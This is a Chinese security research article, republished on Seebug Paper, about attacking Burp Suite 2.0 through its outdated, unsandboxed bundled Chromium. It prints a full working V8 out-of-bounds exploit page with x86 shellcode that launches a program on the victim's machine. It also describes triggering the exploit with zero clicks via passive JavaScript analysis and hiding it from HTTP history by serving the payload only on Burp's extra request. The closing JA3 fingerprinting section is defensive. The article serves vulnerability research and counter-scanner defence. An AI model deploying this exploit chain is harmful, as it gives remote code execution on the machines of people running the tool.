

# 反制爬虫之 Burp Suite RCE

**作者：Wfox  
原文链接：[http://noahblog.360.cn/burp-suite-rce/](http://noahblog.360.cn/burp-suite-rce/)**

## 一、前言

Headless Chrome 是谷歌 Chrome 浏览器的无界面模式，通过命令行方式打开网页并渲染，常用于自动化测试、网站爬虫、网站截图、XSS 检测等场景。

近几年许多桌面客户端应用中，基本都内嵌了 Chromium 用于业务场景使用，但由于开发不当、CEF 版本不升级维护等诸多问题，攻击者可以利用这些缺陷攻击客户端应用以达到命令执行效果。

本文以知名渗透软件 Burp Suite 举例，从软件分析、漏洞挖掘、攻击面扩展等方面进行深入探讨。

## 二、软件分析

以 Burp Suite Pro v2.0beta 版本为例，要做漏洞挖掘首先要了解软件架构及功能点。

将`burpsuite_pro_v2.0.11beta.jar`进行解包，可以发现 Burp Suite 打包了 Windows、Linux、Mac 的 Chromium，可以兼容在不同系统下运行内置 Chromium 浏览器。

![-w869](assets/1698903994-478a3176aa666ca81e6850e19588bfda.jpg)

在 Windows 系统中，Burp Suite v2.0 运行时会将`chromium-win64.7z`解压至`C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\`目录

![img](assets/1698903994-bfa8aee80e884f88b9ad5ef629390490.jpg)

从目录名及数字签名得知 Burp Suite v2.0 是直接引用 JxBrowser 浏览器控件，其打包的 Chromium 版本为 64.0.3282.24。

那如何在 Burp Suite 中使用内置浏览器呢？在常见的使用场景中，`Proxy -> HTTP history -> Response -> Render`及`Repeater -> Render`都能够调用内置 Chromium 浏览器渲染网页。

![img](assets/1698903994-c10e26d158c8d2d3d1d5cdf8152a7fd1.jpg)

当 Burp Suite 唤起内置浏览器`browsercore32.exe`打开网页时，`browsercore32.exe`会创建 Renderer 进程及 GPU 加速进程。

![img](assets/1698903994-87ba581381219db6a58e6e8cbd3feeab.jpg)

browsercore32.exe 进程运行参数如下：

```plain
// Chromium 主进程
C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\browsercore32.exe --port=53070 --pid=13208 --dpi-awareness=system-aware --crash-dump-dir=C:\Users\user\AppData\Local\JxBrowser --lang=zh-CN --no-sandbox --disable-xss-auditor --headless --disable-gpu --log-level=2 --proxy-server="socks://127.0.0.1:0" --disable-bundled-ppapi-flash --disable-plugins-discovery --disable-default-apps --disable-extensions --disable-prerender-local-predictor --disable-save-password-bubble --disable-sync --disk-cache-size=0 --incognito --media-cache-size=0 --no-events --disable-settings-window

// Renderer 进程
C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\browsercore32.exe --type=renderer --log-level=2 --no-sandbox --disable-features=LoadingWithMojo,browser-side-navigation --disable-databases --disable-gpu-compositing --service-pipe-token=C06434E20AA8C9230D15FCDFE9C96993 --lang=zh-CN --crash-dump-dir="C:\Users\user\AppData\Local\JxBrowser" --enable-pinch --device-scale-factor=1 --num-raster-threads=1 --enable-gpu-async-worker-context --disable-accelerated-video-decode --service-request-channel-token=C06434E20AA8C9230D15FCDFE9C96993 --renderer-client-id=2 --mojo-platform-channel-handle=2564 /prefetch:1
```

从进程运行参数分析得知，Chromium 进程以 headless 模式运行、关闭了沙箱功能、随机监听一个端口（用途未知）。

## 三、漏洞利用

Chromium 组件的历史版本几乎都存在着 1Day 漏洞风险，特别是在客户端软件一般不会维护升级 Chromium 版本，且关闭沙箱功能，在没有沙箱防护的情况下漏洞可以无限制利用。

Burp Suite v2.0 内置的 Chromium 版本为 64.0.3282.24，该低版本 Chromium 受到多个历史漏洞影响，可以通过 v8 引擎漏洞执行 shellcode 从而获得 PC 权限。

以 Render 功能演示，利用 v8 漏洞触发 shellcode 打开计算器（此处感谢 Sakura 提供漏洞利用代码）

这个漏洞没有公开的 CVE ID，但其详情可以在[这里](https://bugs.chromium.org/p/chromium/issues/detail?id=880207)找到。该漏洞的 Root Cause 是在进行`Math.expm1`的范围分析时，推断出的类型是`Union(PlainNumber, NaN)`，忽略了`Math.expm1(-0)`会返回`-0`的情况，从而导致范围分析错误，导致 JIT 优化时，错误的将边界检查 CheckBounds 移除，造成了 OOB 漏洞。

```plain
<html>
<head></head>
</body>
<script>
function pwn() {
    var f64Arr = new Float64Array(1);
    var u32Arr = new Uint32Array(f64Arr.buffer);

    function f2u(f) {
        f64Arr[0] = f;
        return u32Arr;
    }

    function u2f(h, l)
    {
        u32Arr[0] = l;
        u32Arr[1] = h;
        return f64Arr[0];
    }

    function hex(i) {
        return "0x" + i.toString(16).padStart(8, "0");
    }

    function log(str) {
        console.log(str);
        document.body.innerText += str + '\n';
    }

    var big_arr = [1.1, 1.2];
    var ab = new ArrayBuffer(0x233);
    var data_view = new DataView(ab);

    function opt_me(x) {
        var oob_arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
        big_arr = [1.1, 1.2];
        ab = new ArrayBuffer(0x233);
        data_view = new DataView(ab);

        let obj = {
            a: -0
        };
        let idx = Object.is(Math.expm1(x), obj.a) * 10;

        var tmp = f2u(oob_arr[idx])[0];
        oob_arr[idx] = u2f(0x234, tmp);
    }
    for (let a = 0; a < 0x1000; a++)
        opt_me(0);

    opt_me(-0);
    var optObj = {
        flag: 0x266,
        funcAddr: opt_me
    };

    log("[+] big_arr.length: " + big_arr.length);

    if (big_arr.length != 282) {
        log("[-] Can not modify big_arr length !");
        return;
    }
    var backing_store_idx = -1;
    var backing_store_in_hign_mem = false;
    var OptObj_idx = -1;
    var OptObj_idx_in_hign_mem = false;

    for (let a = 0; a < 0x100; a++) {
        if (backing_store_idx == -1) {
            if (f2u(big_arr[a])[0] == 0x466) {
                backing_store_in_hign_mem = true;
                backing_store_idx = a;
            } else if (f2u(big_arr[a])[1] == 0x466) {
                backing_store_in_hign_mem = false;
                backing_store_idx = a + 1;
            }
        }

        else if (OptObj_idx == -1) {
            if (f2u(big_arr[a])[0] == 0x4cc) {
                OptObj_idx_in_hign_mem = true;
                OptObj_idx = a;
            } else if (f2u(big_arr[a])[1] == 0x4cc) {
                OptObj_idx_in_hign_mem = false;
                OptObj_idx = a + 1;
            }
        }

    }

    if (backing_store_idx == -1) {
        log("[-] Can not find backing store !");
        return;
    } else
        log("[+] backing store idx: " + backing_store_idx +
            ", in " + (backing_store_in_hign_mem ? "high" : "low") + " place.");

    if (OptObj_idx == -1) {
        log("[-] Can not find Opt Obj !");
        return;
    } else
        log("[+] OptObj idx: " + OptObj_idx +
            ", in " + (OptObj_idx_in_hign_mem ? "high" : "low") + " place.");

    var backing_store = (backing_store_in_hign_mem ?
        f2u(big_arr[backing_store_idx])[1] :
        f2u(big_arr[backing_store_idx])[0]);
    log("[+] Origin backing store: " + hex(backing_store));

    var dataNearBS = (!backing_store_in_hign_mem ?
        f2u(big_arr[backing_store_idx])[1] :
        f2u(big_arr[backing_store_idx])[0]);

    function read(addr) {
        if (backing_store_in_hign_mem)
            big_arr[backing_store_idx] = u2f(addr, dataNearBS);
        else
            big_arr[backing_store_idx] = u2f(dataNearBS, addr);
        return data_view.getInt32(0, true);
    }

    function write(addr, msg) {
        if (backing_store_in_hign_mem)
            big_arr[backing_store_idx] = u2f(addr, dataNearBS);
        else
            big_arr[backing_store_idx] = u2f(dataNearBS, addr);
        data_view.setInt32(0, msg, true);
    }

    var OptJSFuncAddr = (OptObj_idx_in_hign_mem ?
        f2u(big_arr[OptObj_idx])[1] :
        f2u(big_arr[OptObj_idx])[0]) - 1;
    log("[+] OptJSFuncAddr: " + hex(OptJSFuncAddr));

    var OptJSFuncCodeAddr = read(OptJSFuncAddr + 0x18) - 1;
    log("[+] OptJSFuncCodeAddr: " + hex(OptJSFuncCodeAddr));

    var RWX_Mem_Addr = OptJSFuncCodeAddr + 0x40;
    log("[+] RWX Mem Addr: " + hex(RWX_Mem_Addr));

    var shellcode = new Uint8Array(
           [0x89, 0xe5, 0x83, 0xec, 0x20, 0x31, 0xdb, 0x64, 0x8b, 0x5b, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b,
            0x1c, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b, 0x43, 0x08, 0x89, 0x45, 0xfc, 0x8b, 0x58, 0x3c, 0x01, 0xc3,
            0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x7b, 0x20, 0x01, 0xc7, 0x89, 0x7d, 0xf8, 0x8b, 0x4b, 0x24,
            0x01, 0xc1, 0x89, 0x4d, 0xf4, 0x8b, 0x53, 0x1c, 0x01, 0xc2, 0x89, 0x55, 0xf0, 0x8b, 0x53, 0x14,
            0x89, 0x55, 0xec, 0xeb, 0x32, 0x31, 0xc0, 0x8b, 0x55, 0xec, 0x8b, 0x7d, 0xf8, 0x8b, 0x75, 0x18,
            0x31, 0xc9, 0xfc, 0x8b, 0x3c, 0x87, 0x03, 0x7d, 0xfc, 0x66, 0x83, 0xc1, 0x08, 0xf3, 0xa6, 0x74,
            0x05, 0x40, 0x39, 0xd0, 0x72, 0xe4, 0x8b, 0x4d, 0xf4, 0x8b, 0x55, 0xf0, 0x66, 0x8b, 0x04, 0x41,
            0x8b, 0x04, 0x82, 0x03, 0x45, 0xfc, 0xc3, 0xba, 0x78, 0x78, 0x65, 0x63, 0xc1, 0xea, 0x08, 0x52,
            0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0x65, 0x18, 0xe8, 0xb8, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51,
            0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x41, 0x51, 0x53, 0xff,
            0xd0, 0x31, 0xc9, 0xb9, 0x01, 0x65, 0x73, 0x73, 0xc1, 0xe9, 0x08, 0x51, 0x68, 0x50, 0x72, 0x6f,
            0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0x65, 0x18, 0xe8, 0x87, 0xff, 0xff, 0xff, 0x31, 0xd2,
            0x52, 0xff, 0xd0, 0x90, 0x90, 0xfd, 0xff]
    );

    log("[+] writing shellcode ... ");
    for (let i = 0; i < shellcode.length; i++)
        write(RWX_Mem_Addr + i, shellcode[i]);

    log("[+] execute shellcode !");
    opt_me();
}
pwn();
</script>
</body>
</html>
```

用户在通过 Render 功能渲染页面时触发 v8 漏洞成功执行 shellcode。

![img](assets/1698903994-1f7c3dcc81c12f1890e78e3248ccffe8.jpg)

## 四、进阶攻击

Render 功能需要用户交互才能触发漏洞，相对来说比较鸡肋，能不能 0click 触发漏洞？答案是可以的。

Burp Suite v2.0 的`Live audit from Proxy`被动扫描功能在默认情况下开启 JavaScript 分析引擎（JavaScript analysis），用于扫描 JavaScript 漏洞。

![img](assets/1698903994-c38dc194a1fd4b3cafe04b5bc56ee4a3.jpg)

其中 JavaScript 分析配置中，默认开启了动态分析功能（[dynamic analysis techniques](https://portswigger.net/blog/dynamic-analysis-of-javascript)）、额外请求功能（Make requests for missing Javascript dependencies）

![img](assets/1698903994-d0f0a3ff00e02212e58deab7683517e2.jpg)

JavaScript 动态分析功能会调用内置 chromium 浏览器对页面中的 JavaScript 进行 DOM XSS 扫描，同样会触发页面中的 HTML 渲染、JavaScript 执行，从而触发 v8 漏洞执行 shellcode。

额外请求功能当页面存在 script 标签引用外部 JS 时，除了页面正常渲染时请求加载 script 标签，还会额外发起请求加载外部 JS。即两次请求加载外部 JS 文件，并且分别执行两次 JavaScript 动态分析。

额外发起的 HTTP 请求会存在明文特征，后端可以根据该特征在正常加载时返回正常 JavaScript 代码，额外加载时返回漏洞利用代码，从而可以实现在 Burp Suite HTTP history 中隐藏攻击行为。

```plain
GET /xxx.js HTTP/1.1
Host: www.xxx.com
Connection: close
Cookie: JSESSIONID=3B6FD6BC99B03A63966FC9CF4E8483FF
```

JavaScript 动态分析 + 额外请求 + chromium 漏洞组合利用效果：

![Kapture 2021-09-06 at 2.14.35](assets/1698903994-2772c1ee244fc96a596265d2dfcf8539.gif)

## 五、流量特征检测

默认情况下 Java 发起 HTTPS 请求时协商的算法会受到 JDK 及操作系统版本影响，而 Burp Suite 自己实现了 HTTPS 请求库，其 TLS 握手协商的算法是固定的，结合 JA3 算法形成了 TLS 流量指纹特征可被检测，有关于 JA3 检测的知识点可学习《[TLS Fingerprinting with JA3 and JA3S](https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967)》。

[Cloudflare](https://portswigger.net/daily-swig/https-everywhere-cloudflare-planning-improvements-to-middleware-detection-utility)开源并在 CDN 产品上应用了[MITMEngine](https://github.com/cloudflare/mitmengine)组件，通过 TLS 指纹识别可检测出恶意请求并拦截，其覆盖了大多数 Burp Suite 版本的 JA3 指纹从而实现检测拦截。这也可以解释为什么在渗透测试时使用 Burp Suite 请求无法获取到响应包。

以 Burp Suite v2.0 举例，实际测试在各个操作系统下，同样的 jar 包发起的 JA3 指纹是一样的。

![-w672](assets/1698903994-455f0aeec22d3b607d19eb88a1f02dce.jpg)

不同版本 Burp Suite 支持的 TLS 算法不一样会导致 JA3 指纹不同，但同样的 Burp Suite 版本 JA3 指纹肯定是一样的。如果需要覆盖 Burp Suite 流量检测只需要将每个版本的 JA3 指纹识别覆盖即可检测 Burp Suite 攻击从而实现拦截。

本文章涉及内容仅限防御对抗、安全研究交流，请勿用于非法途径。

- - -

![Paper](assets/1698903994-446834a71d30acd0479540c0e3cdf1d3.jpeg) 本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1696/](https://paper.seebug.org/1696/)
